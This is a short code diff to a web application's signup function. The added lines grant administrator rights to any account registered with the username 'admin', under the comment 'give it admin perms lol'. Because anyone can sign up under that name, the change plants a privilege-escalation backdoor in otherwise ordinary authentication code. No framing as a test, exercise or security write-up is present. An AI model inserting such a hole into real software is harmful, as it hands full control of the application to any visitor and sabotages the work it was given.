@@ -60,6 +60,11 @@ def signup():
         db.session.rollback()
         return jsonify(error="Username already taken"), HTTPStatus.CONFLICT
 
+    # if the username is admin, give it admin perms lol
+    if user.username == "admin":
+        user.admin = True
+        db.session.commit()
+
     # issue access with the subject being the user id
     token = Auth.issue_access(user.id)
     # Create a response with status CREATED
